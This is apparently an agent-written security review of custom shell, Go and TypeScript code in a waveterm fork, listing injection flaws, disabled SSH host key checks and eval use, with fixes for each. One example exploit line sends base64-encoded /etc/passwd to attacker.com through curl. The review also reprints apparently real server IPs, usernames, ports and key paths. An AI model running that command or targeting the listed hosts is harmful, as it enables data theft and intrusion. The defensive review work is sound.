# Security Review — PhenixStar/waveterm Custom Code
**Date:** 2026-03-25
**Reviewer:** code-reviewer agent
**Scope:** contrib/widgets/scripts/*, pkg/wshrpc/wshremote/sysinfo.go, frontend/app/tab/tabcontextmenu.ts, frontend/app/store/keymodel.ts

---

## Findings

---

### [CRITICAL] Command injection via unquoted `$CMD` passed to SSH in `fan-out.sh`

**File:** `contrib/widgets/scripts/fan-out.sh:59`

**Evidence:**
```bash
ssh -o ConnectTimeout=10 -o BatchMode=yes "${SSH_ARGS[@]}" "$CMD"
```
`$CMD` is user-supplied (first argument: `"$1"`). It is passed directly as a positional argument to `ssh`, which interprets it as a remote command string executed by the remote shell. If `$CMD` contains shell metacharacters (`;`, `&&`, `$(...)`, backticks), they execute on the remote host. Example exploit:
```bash
fan-out.sh "uptime; curl http://attacker.com/$(cat /etc/passwd | base64)"
```
This is a direct remote code execution vector against every host in the fan-out list.

**Recommendation:** Either:
1. Validate `$CMD` against an allowlist of safe commands before use.
2. Pass the command through `printf '%q'` quoting: `ssh "${SSH_ARGS[@]}" "$(printf '%q ' $CMD)"` — but note this still requires that the user has no access to set $CMD from untrusted input.
3. More defensively: require that commands be pre-defined named slots rather than free-form strings.

---

### [CRITICAL] JSON injection via `$CMD` and `$conn` into raw JSON string in `fan-out-blocks.sh`

**File:** `contrib/widgets/scripts/fan-out-blocks.sh:32-35`

**Evidence:**
```bash
meta=$(printf '{"view":"term","controller":"cmd","connection":"%s","cmd":"%s","cmd:runonstart":true,...}' \
    "$conn" \
    "$(printf '%s' "$CMD" | sed 's/"/\\"/g')")
wsh createblock --meta "$meta"
```
`$conn` is sourced from `jq -r 'keys[]'` on `connections.json` — any key in that file can inject into the JSON string. Only double quotes are escaped in `$CMD`; other metacharacters (backslash, newline, tab, null) can break JSON parsing. If `wsh` processes the meta JSON with `eval` or similar, this is a command injection path.

`$conn` receives no escaping at all before substitution into the JSON string.

**Recommendation:** Use a proper JSON building tool (e.g., `jq -n --arg cmd "$CMD" --arg conn "$conn" '{view:"term", ...}'`) instead of printf-based string concatenation.

---

### [CRITICAL] Unquoted SSH args string allows word-splitting injection in `deploy-companion.sh`

**File:** `contrib/widgets/scripts/deploy-companion.sh:69, 86, 94`

**Evidence:**
```bash
ssh -o ConnectTimeout=8 -o BatchMode=yes $ssh_args "mkdir -p ~/$REMOTE_DIR"
scp -o BatchMode=yes $scp_port $scp_key "$SCRIPT_DIR/$script" "$scp_target"
generate_aliases | ssh -o BatchMode=yes $ssh_args "cat > ~/$REMOTE_ALIASES && chmod +x ~/$REMOTE_DIR/*.sh"
```
`$ssh_args`, `$scp_port`, and `$scp_key` are unquoted. The values originate from the hardcoded `CONNECTIONS` array but are extracted via regex into separate variables and then concatenated back as plain strings. If any connection entry contained spaces or shell metacharacters in its key path or hostname, word-splitting would corrupt the SSH argument list. Additionally, `~/$REMOTE_DIR` tilde expansion in the remote command is shell-interpreted — if `REMOTE_DIR` were attacker-controlled it could escape the path.

**Recommendation:** Use arrays for SSH arguments rather than a single string. Replace:
```bash
$ssh_args  # BAD
```
with:
```bash
ssh_args_arr=(-o ConnectTimeout=8 -o BatchMode=yes -p "$port" -i "$keyfile" "$target")
ssh "${ssh_args_arr[@]}"
```

---

### [IMPORTANT] Unquoted `$CMD` passed to `wsh ssh` without sanitization in `quick-connect.sh`

**File:** `contrib/widgets/scripts/quick-connect.sh:60`

**Evidence:**
```bash
wsh ssh "$conn" -c "$cmd"
```
`$cmd` is sourced from the `BOOKMARKS` associative array, which is hardcoded — so this is not a live injection risk from external input. However, the `-c` flag passes `$cmd` as a shell command string to the remote session. If the bookmarks file were user-editable or loaded from an external source, this becomes an injection vector.

The fallback SSH branches (lines 65-75) pass `"$cmd"` as an SSH remote command; if any bookmark command contained shell operators these would execute on the remote.

**Recommendation:** Document that bookmarks must not be populated from untrusted sources. Consider validating `$cmd` or using pre-defined command slots.

---

### [IMPORTANT] `StrictHostKeyChecking=no` disables MITM protection in `cf-tunnel-status.sh` and `mikrotik-dashboard.sh`

**Files:**
- `contrib/widgets/scripts/cf-tunnel-status.sh:55-58` — `StrictHostKeyChecking=no`
- `contrib/widgets/scripts/mikrotik-dashboard.sh:75` — `StrictHostKeyChecking=no`

**Evidence:**
```bash
-o StrictHostKeyChecking=no
-o UserKnownHostsFile=/dev/null   # also present in ssh-health.ps1
```
Disabling host key checking means any host-in-the-middle silently impersonates the target. Combined with `UserKnownHostsFile=/dev/null` in `ssh-health.ps1`, host keys are never persisted or validated. An attacker on the network path can intercept the SSH session and receive all command output, including `docker ps` data that may expose internal service names, ports, and credentials in environment variables.

**Recommendation:** Either:
- Use `StrictHostKeyChecking=accept-new` (one-time trust on first connection, then enforce), which `docker-manager.sh` and `git-sync-status.sh` already do correctly.
- Or pin known host fingerprints using a script-local known_hosts file: `-o UserKnownHostsFile=/path/to/widget_known_hosts`.

---

### [IMPORTANT] Hardcoded real infrastructure details (IPs, usernames, key paths) committed to the repo

**Files:**
- `contrib/widgets/scripts/deploy-companion.sh:49-52`
- `contrib/widgets/scripts/cf-tunnel-status.sh:6-9`
- `contrib/widgets/scripts/docker-manager.sh:6-9`
- `contrib/widgets/scripts/mikrotik-dashboard.sh:6-9`
- `contrib/widgets/scripts/git-sync-status.sh:7-10`
- `contrib/widgets/scripts/quick-connect.sh:65-75`

**Evidence:**
```
CONNECTIONS[phenix@dgx]="phenix@120.28.138.55 -p 2442 -i $HOME/.ssh/id_ed25519"
CONNECTIONS[alaa@dgx1]="alaa@120.28.138.55 -p 2442 -i $HOME/.ssh/id_ed25519_alaa"
CONNECTIONS[root@mce-new]="root@152.42.191.40 -p 2222 -i $HOME/.ssh/id_ed25519_alaa"
SSH_HOST="120.28.138.55"; SSH_PORT="2442"; SSH_USER="phenix"
ROUTER_HOST="10.1.1.1"; ROUTER_USER="alaa"
root@152.42.191.40 -p 2222
```
Real production IPs, SSH usernames, non-standard ports, and key file paths are hardcoded in committed scripts. This exposes attack surface: an adversary reading the repo knows exactly which hosts to target, which users to brute-force, and which ports are open.

**Recommendation:** Move infrastructure config to a local `.env` file (gitignored) and `source` it at the top of each script. Use placeholder values in the committed scripts. Add `.env` to `.gitignore`.

---

### [IMPORTANT] `eval "$CMD"` fallback in `ctx-launch.sh` when `wsh` is unavailable

**File:** `contrib/widgets/scripts/ctx-launch.sh:97`

**Evidence:**
```bash
else
    # Fallback: just run the command directly
    echo -e "\033[33mwsh not available — running $TOOL directly\033[0m"
    eval "$CMD"
fi
```
`$CMD` is looked up from the `TOOL_CMD` associative array based on `$TOOL`, which is `$1` (user-controlled). While `$TOOL` is validated against the array (line 67: `if [[ -z "$CMD" ]]; then`), `$CMD` values themselves include shell constructs:
- `TOOL_CMD[logs]="tail -f /var/log/syslog 2>/dev/null || journalctl -f"`
- `TOOL_CMD[ports]="ss -tlnp || netstat -tlnp"`
- `TOOL_CMD[gpu]="watch -n1 nvidia-smi"`

These contain `||` and other operators that `eval` will expand. If a future maintainer adds an entry with command substitution or sourced from user input, `eval` becomes a trivial injection point. `eval` is unnecessary here — a direct call would work for all these cases.

**Recommendation:** Replace `eval "$CMD"` with direct execution using an array. Store commands as arrays in `TOOL_CMD` or split the string safely:
```bash
read -ra cmd_arr <<< "$CMD"
"${cmd_arr[@]}"
```
Or better, map each tool to its own dedicated execution branch without `eval`.

---

### [MODERATE] JSON meta string injection via `$CWD` (Windows paths with backslashes) in `ctx-launch.sh`

**File:** `contrib/widgets/scripts/ctx-launch.sh:74-88`

**Evidence:**
```bash
META="{\"view\":\"term\",\"controller\":\"cmd\",\"cmd\":\"$CMD\",...
ESCAPED_CWD=$(echo "$CWD" | sed 's/\\/\\\\/g')
META="$META,\"cmd:cwd\":\"$ESCAPED_CWD\""
```
Only backslashes are escaped. If `$CWD` contains double quotes, forward slashes in unusual paths, or JSON control characters (newline, tab), the resulting JSON will be malformed or inject additional keys. `$CMD` similarly gets no escaping in the JSON string at line 74.

**Recommendation:** Use `jq` to construct the JSON object safely:
```bash
META=$(jq -n --arg cmd "$CMD" --arg conn "$CONN" --arg cwd "$CWD" \
  '{view:"term",controller:"cmd",cmd:$cmd,"cmd:interactive":true,...}')
```

---

### [MODERATE] `wsh ssh "$conn" -c "$cmd"` — connection name from bookmark used as shell argument without validation

**File:** `contrib/widgets/scripts/quick-connect.sh:60`

**Evidence:**
```bash
wsh ssh "$conn" -c "$cmd"
```
`$conn` comes from `BOOKMARKS[$key]` after IFS split on `|`. If a bookmark label contained `|` characters the IFS split would misalign fields. `$conn` itself (e.g. `phenix@dgx`) is passed as a `wsh` argument — if `wsh` interprets connection names via shell expansion this could be a vector.

**Recommendation:** Validate that `$conn` matches the expected `user@host` pattern before use:
```bash
[[ "$conn" =~ ^[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+$ ]] || { echo "Invalid conn"; continue; }
```

---

### [MODERATE] `StrictHostKeyChecking=no` + `UserKnownHostsFile=/dev/null` in `ssh-health.ps1`

**File:** `contrib/widgets/scripts/ssh-health.ps1:88-90`

**Evidence:**
```powershell
'-o', 'StrictHostKeyChecking=no'
'-o', 'UserKnownHostsFile=/dev/null'
```
Every SSH health check runs with no host verification and discards known_hosts. This is a monitoring tool that runs continuously — any network attacker can impersonate all SSH targets and return fake `echo OK` output, causing the monitor to report all hosts as healthy when they may be down or compromised.

**Recommendation:** Use `StrictHostKeyChecking=accept-new` and a persistent `UserKnownHostsFile` path so fingerprints are stored and enforced after first contact.

---

### [MODERATE] `wsh setvar/getvar` key construction with user-controlled segment in `widget-state.sh`

**File:** `contrib/widgets/lib/widget-state.sh:11, 18`

**Evidence:**
```bash
wsh setvar "widget:state:${key}" "${value}"
wsh getvar "widget:state:${key}"
```
`$key` is passed in by callers (e.g. `widget_save_state "cf-tunnels:summary" ...`). The key is prefixed with `widget:state:` but if `$key` contained path-traversal-like segments or special characters interpreted by the `wsh` variable store (null bytes, slashes, etc.), it could access unintended variable namespaces.

Currently all callers use hardcoded string literals for keys (safe). This is a latent risk if the function is called with dynamic keys in future.

**Recommendation:** Add key validation:
```bash
[[ "$key" =~ ^[a-zA-Z0-9:._-]+$ ]] || return 1
```

---

### [MODERATE] Remote script injected via here-string includes hardcoded paths without validation in `git-sync-status.sh`

**File:** `contrib/widgets/scripts/git-sync-status.sh:81-103, 213`

**Evidence:**
```bash
remote_script=$(build_remote_script "${remote_paths[@]}")
ssh ... "bash -s" <<< "$remote_script"
```
`build_remote_script` constructs a bash script using `printf` with `%s` substitution of `$path` values. These paths come from the hardcoded `REMOTE_REPOS` associative array, so currently safe. But paths are embedded directly into the generated script without quoting beyond the `printf '"%s"'` pattern — if paths ever come from user input or a config file, this becomes a shell injection into the dynamically generated remote script.

**Recommendation:** Paths used in `build_remote_script` are double-quoted in the printf output (`printf '..."%s"...'`), which is correct for spaces. However, the function should still validate that path values match expected patterns to prevent future misuse.

---

### [LOW] `source "$(dirname "$0")/../lib/widget-state.sh"` — path traversal risk if script is symlinked

**Files:**
- `contrib/widgets/scripts/cf-tunnel-status.sh:14`
- `contrib/widgets/scripts/docker-manager.sh:15`

**Evidence:**
```bash
source "$(dirname "$0")/../lib/widget-state.sh"
```
`$0` is the script invocation path. If the script is invoked via a symlink in an arbitrary location, `dirname "$0"` resolves to the symlink's directory — not the actual script directory. The `../lib/widget-state.sh` source path would then point to a different file. An attacker who can create a symlink and control what is at the relative path could source an arbitrary file.

**Recommendation:** Use `$(cd "$(dirname "$0")" && pwd)` to get the real directory, or use `${BASH_SOURCE[0]}` instead of `$0`:
```bash
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/../lib/widget-state.sh"
```

---

### [LOW] `sysinfo.go` — `exec.Command("nvidia-smi", ...)` uses a fixed binary name without path

**File:** `pkg/wshrpc/wshremote/sysinfo.go:116-119`

**Evidence:**
```go
out, err := exec.Command("nvidia-smi",
    "--query-gpu=utilization.gpu,memory.used,memory.total",
    "--format=csv,noheader,nounits").Output()
```
`exec.Command` with a bare binary name resolves via `$PATH`. No user-controlled input is passed as arguments (all arguments are hardcoded string literals), so there is no injection risk here. However, if an attacker can manipulate `$PATH` on the remote host where `wsh` runs, they could substitute a malicious `nvidia-smi` binary.

**Recommendation:** Use an absolute path where known (e.g. `/usr/bin/nvidia-smi`) or validate the resolved path. Low severity because `$PATH` manipulation requires existing host compromise.

---

### [LOW] `tabcontextmenu.ts` — preset metadata from `fullConfig.presets` applied directly to tab meta via `SetMetaCommand`

**File:** `frontend/app/tab/tabcontextmenu.ts:122-124`

**Evidence:**
```typescript
click: () =>
    fireAndForget(async () => {
        await env.rpc.SetMetaCommand(TabRpcClient, { oref, meta: preset });
```
`preset` is the full preset object from `fullConfig.presets[presetName]` with no field filtering. Any key in a preset is applied directly as tab metadata. If a user could write arbitrary preset keys to the config (e.g., via a malicious workspace template or config import), they could set dangerous meta keys on tabs (e.g., `cmd`, `connection`, `cmd:initscript`).

**Recommendation:** Either: (a) validate that preset keys only include known safe display/background keys before applying, or (b) document clearly that presets must come from trusted config sources only.

---

### [LOW] `keymodel.ts` — `getSettingsKeyAtom` reads settings that influence security-sensitive keybinding behavior

**File:** `frontend/app/store/keymodel.ts:80-81, 566-594`

**Evidence:**
```typescript
const disableDisplay = globalStore.get(getSettingsKeyAtom("app:disablectrlshiftdisplay"));
const disableCtrlShiftArrows = globalStore.get(getSettingsKeyAtom("app:disablectrlshiftarrows"));
```
Settings keys are read from global config and directly influence keybinding behavior. These are standard settings lookups with no security concern by themselves. No user input reaches key handlers in an injectable way. No finding here.

---

## Summary Table

| Severity | Count | Issues |
|----------|-------|--------|
| CRITICAL | 3 | fan-out.sh RCE, fan-out-blocks.sh JSON injection, deploy-companion.sh unquoted SSH args |
| IMPORTANT | 4 | quick-connect.sh cmd passthrough, StrictHostKeyChecking=no (2 files), hardcoded infra details |
| MODERATE | 5 | ctx-launch.sh eval + JSON injection, quick-connect.sh conn validation, ssh-health.ps1 MITM, widget-state.sh key injection, git-sync-status.sh remote script injection |
| LOW | 4 | source symlink path, nvidia-smi PATH lookup, preset meta passthrough, (keymodel clean) |

## Priority Actions

1. **Immediate:** Fix `fan-out.sh` — restrict `$CMD` to a validated allowlist or use positional argument arrays for SSH. This is a live RCE vector.
2. **Immediate:** Fix `fan-out-blocks.sh` — build JSON via `jq` not `printf` string concat.
3. **Short-term:** Replace `StrictHostKeyChecking=no` with `accept-new` in `cf-tunnel-status.sh`, `mikrotik-dashboard.sh`, and `ssh-health.ps1`.
4. **Short-term:** Move hardcoded IPs/users/ports to a gitignored `.env` file.
5. **Short-term:** Replace `eval "$CMD"` in `ctx-launch.sh` with array-based execution.
6. **Medium-term:** Fix `source` calls to use `${BASH_SOURCE[0]}` in widget scripts.
